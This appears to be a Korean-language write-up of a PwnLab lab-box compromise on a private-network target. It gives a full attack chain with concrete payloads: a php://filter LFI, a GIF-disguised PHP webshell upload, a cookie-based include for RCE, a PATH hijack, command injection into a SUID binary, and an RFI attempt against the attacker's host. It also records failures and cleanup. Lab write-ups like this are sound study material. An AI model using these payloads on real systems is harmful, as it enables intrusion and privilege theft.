# PwnLab — 실행 기록 (2026-08-20)

타겟 `192.168.248.29` / Debian 8 jessie i686 / Fundamental / 플래그 2개 모두 획득.
정찰 17:37 → root 17:45 (KST). 산출물 32개 · Kali `~/PG/PwnLab/`.

## 경로

1. tcp/80 Apache 2.4.10, `index.php?page=` → `php://filter/convert.base64-encode/resource=config`
   (리소스에 `.php` 를 안 붙이는 게 요점 — 코드가 `include($_GET['page'].".php")`)
2. `config.php` → MySQL `root` / `H4u%QJ_H99` / db `Users`
3. tcp/3306 이 외부 개방 → Kali 에서 `mysql --skip-ssl` 로 직접 덤프
   → kent/mike/kane 의 base64 저장 비밀번호 (JWzXuBJJNy / SIfdsTEn6I / iSv5Ym2GRo)
4. kent 로 로그인(login.php 는 prepared stmt, SQLi 없음) → GIF89a 매직 + `<?php system()` 을
   `.gif` 로 업로드(확장자 화이트리스트 · Content-Type · getimagesize 3중 검사 전부 통과)
5. `index.php` 상단의 `include("lang/".$_COOKIE['lang'])` — 여기는 확장자가 안 붙는다
   → `Cookie: lang=../upload/<md5>.gif` → www-data RCE → tcp/443 리버스셸(첫 시도 성공)
6. `su kent` → `su kane` (DB 비밀번호 재사용) → `/home/kane/local.txt` + SUID `msgmike`
7. `msgmike` 는 `cat /home/mike/msg.txt` 를 상대경로로 호출 → PATH 하이재킹 → mike
8. `msg2root` 는 `system("/bin/echo %s >> /root/messages.txt")` → `hi; /bin/bash -p` → euid 0
   → `python os.setresuid(0,0,0)` → 완전한 root → `/root/proof.txt`

## 플래그 (2026-08-20 인스턴스)

| | 경로 | 값 |
|---|---|---|
| user | `/home/kane/local.txt` | `e7fb032dc3da97822fc7dc2d65ffcc18` |
| root | `/root/proof.txt` | `540256bedfbf87d15d54425649220e30` |

`/root/flag.txt`(mode 000, `Your flag is in another file...`)는 미끼.
둘 다 대화형 pty 셸에서 원위치 `cat`. 웹셸로 읽지 않았다.

## harvest.sh

두 권한 레벨에서 실행: www-data 889행 / root 981행. **수정하지 않았다.**

- `HARVEST_PW` 평문 유출 없음 — root 실행 시 `HARVEST_PW=none` 을 넘겼고 `ENV` 섹션에 안 나온다.
  (`grep -n 'HARVEST_PW' harvest_root.txt` 는 섹션 라벨 한 줄만 매치)
- 사소한 잔버그 하나: sudo 가 없는 호스트에서 `sudo -S -l` 분기가
  `sh: echo: I/O error` 를 뱉는다. 동작에는 영향 없어 손대지 않았다.
- **가장 값나간 관측** — 같은 스크립트가 권한에 따라 다른 SUID 목록을 낸다.
  www-data 시점에는 `msgmike`/`msg2root` 가 아예 안 보인다. `/home/*` 이 `drwxr-x---` 라
  `find` 가 디렉터리를 못 연다. 커스텀 SUID 부재를 결론으로 삼으면 안 되는 실례.

## 실패 로그 5건

| 파일 | 내용 |
|---|---|
| `try1_msgmike_histexpand.log` | `printf "#!/bin/bash..."` 가 bash 히스토리 확장에 걸림(`event not found`). `&&` 체인이라 `mkdir` 조차 안 돌아 다음 시도에서 엉뚱한 증상이 났다. `set +H` 는 **같은 줄에 두면 무효**(줄 읽는 시점에 확장) |
| `try2_nnmap_alias_notfound.log` | `nnmap` 별칭이 비대화형 tmux zsh 에서 `command not found`. 스캔이 0초에 끝났는데 10분간 "돌고 있다"고 착각. 17:47 에 전개 재실행 |
| `try3_mysql_ssl.log` | MariaDB 클라이언트 기본 TLS 요구 → `SSL is required`. `--ssl-mode=DISABLED` 는 Oracle 클라이언트 옵션이라 `unknown variable`. 정답은 `--skip-ssl`. 추가로 재시도를 반복했더니 `max_connect_errors` 로 IP 차단(`Host ... is blocked because of many connection errors`) |
| `try4_fakecat_shadowed_PATH.log` | root 획득 후 `cat /root/proof.txt` 가 **조용히 무출력**. `PATH=/tmp/.pth` 가 mike 셸 → msg2root → root 셸까지 3단 상속돼 가짜 `cat` 이 잡아먹고 있었다 |
| `try5_rfi_blocked.log` | `?page=http://192.168.45.207:8000/rfitest` — include 자리 공백, 우리 HTTP 서버 로그에 **요청 자체가 없음**. 타겟은 `allow_url_fopen=On` / `allow_url_include=Off` |

막다른 길: kent 홈은 빈 껍데기 / `john` 사용자는 dotfile 뿐이고 DB 에도 없다(PG 장식으로 추정) /
NFS 는 `mount.nfs` SUID + 111 개방이지만 `/etc/exports` 가 비어 있고 2049 미개방 /
login.php 는 소스를 읽어보니 prepared stmt 라 SQLi 시도 자체를 접었다.

## 단정을 쓰기 전에 실측한 것

- **`bash -p`** — Kali 에서 SUID root C 프로그램으로 재현. `-p` 없으면 EUID 가 real uid 로 떨어지고(`EUID=1000 UID=1000`), `-p` 를 주면 `EUID=0 UID=1000`.
  부수 발견: 처음 `/tmp` 에서 하니 `-p` 를 줘도 EUID=1000 — **Kali `/tmp` 가 `nosuid`**(`findmnt -no OPTIONS /tmp`).
- **`curl -F` 기본 Content-Type** — `;type=` 을 빼도 `.gif` 면 curl 이 `Content-Type: image/gif` 를 스스로 넣는다(로컬 nc 로 요청 캡처). 그래서 이 박스는 `;type=` 없이도 통과했을 것이다. 노트에 그대로 적었다.
- **exim4** — SUID `/usr/sbin/exim4` 를 대안 경로로 적으려다 버전을 재보니 `4.84.2-1`(Debian 백포트 패치본). 취약 버전대라고 단정하지 않고 `[가정]` 으로 낮춰 적었다.
- **PHP 5.6.17-0+deb8u1** — 널바이트 절단이 안 되는 이유의 근거.

## 남긴 흔적

타겟 정리 완료(전부 삭제 확인): `/tmp/63f0276ffd69eb424bf6093795ac9850.gif`(= `upload/`, `/var/www/html/upload` 는 `/tmp` 심볼릭 링크) · `/tmp/h.sh` · `/tmp/.h/` · `/tmp/.pth/` · `/tmp/f` · `/tmp/rfitest.php`.
`/var/www/html` 원본 6항목 무수정.

지우지 않고 기록만 한 것 — `/var/log/auth.log` 의 su 체인 5줄, `/var/log/apache2/access.log`(LFI·업로드·nmap NSE 포함), `wtmp` 에는 흔적 없음(su 는 wtmp 를 안 쓰고 SSH 로그인을 한 적이 없다), `.bash_history` 는 원래 `/dev/null` 링크이거나 0바이트.
`/root/messages.txt` 는 `/dev/null` 링크라 `msg2root` 로 넣은 문자열이 어디에도 안 남았다.
확인하지 않은 것: MySQL 일반 쿼리 로그 활성 여부, `/var/log/syslog`.

Kali: tmux `pwnlab_nmap`·`pwnlab_http`·`pwnlab_xfer`·`pwnlab_xfer2`·`ct` 종료(8000/4445/4446/9099 정리 확인).
`~/PG/_lib/rfitest.*` 삭제 — `_lib` 은 `harvest.sh` + 백업 2개 원상태.
`~/suidtest/`·`/tmp/suidtest*`(root 소유) 삭제.
**tmux `pwnlab_shell` 의 root 셸은 살려두었다** — 총괄 재확인용.

## 노트

`03. PG\PwnLab.md` 신규 761행. 태그는 전부 기존 leaf 재사용(신규 발명 없음):
`tech/web/lfi-rfi` · `tech/web/file-upload` · `tech/db/mysql` · `tech/cred/reuse` ·
`tech/lin/suid` · `tech/lin/path-hijack` · `tech/rce/cmd-injection` · `tech/payload/revshell`.
`manual_tags: true`. CVE 를 본문에서 전혀 인용하지 않아 `manual_cves` 는 켜지 않았다.
스크린샷 3장 → `파일보관\PG-PwnLab-{home,login,upload-denied}.png`.
